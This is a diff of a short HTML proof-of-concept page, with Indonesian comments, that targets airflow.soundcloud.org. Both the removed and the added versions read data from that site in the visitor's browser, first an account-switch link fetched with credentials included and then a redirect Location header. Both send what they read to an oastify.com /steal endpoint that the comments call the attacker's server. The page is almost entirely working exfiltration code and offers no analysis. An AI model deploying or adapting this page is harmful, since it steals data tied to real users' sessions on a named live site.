@@ -1,32 +1,31 @@
+<!DOCTYPE html>
 <html>
 <head>
-    <title>POC - Ambil Link dengan CORS</title>
+    <title>POC - Ambil Header Location dengan XHR</title>
 </head>
 <body>
-    <h1>POC - Ambil Link dengan CORS</h1>
+    <h1>POC - Ambil Header Location dengan XHR</h1>
     <script>
-        fetch('https://airflow.soundcloud.org', {
-            credentials: 'include'
-        })
-        .then(response => response.text())
-        .then(data => {
-            var parser = new DOMParser();
-            var doc = parser.parseFromString(data, 'text/html');
-            var linkElement = doc.getElementById('switch_account');
-            if (linkElement) {
-                var linkHref = linkElement.href;
-                // Kirim link ke server penyerang
-                var xhr = new XMLHttpRequest();
-                xhr.open("GET", "https://569mgtujeb7m4nztnsxzf9te157wvmjb.oastify.com/steal?link=" + encodeURIComponent(linkHref), true);
-                xhr.send();
-            } else {
-                console.log("Element dengan id 'switch_account' tidak ditemukan.");
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://airflow.soundcloud.org', true);
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === XMLHttpRequest.HEADERS_RECEIVED) {
+                var locationHeader = xhr.getResponseHeader('Location');
+                if (locationHeader) {
+                    // Kirim lokasi ke server penyerang
+                    var exfiltrateXhr = new XMLHttpRequest();
+                    exfiltrateXhr.open("GET", "https://569mgtujeb7m4nztnsxzf9te157wvmjb.oastify.com/steal?location=" + encodeURIComponent(locationHeader), true);
+                    exfiltrateXhr.send();
+                } else {
+                    console.log("Header 'Location' tidak ditemukan.");
+                }
             }
-        })
-        .catch(error => console.log("Gagal mengambil link:", error));
+        };
+        xhr.send();
     </script>
 </body>
 </html>
+
 
 
 
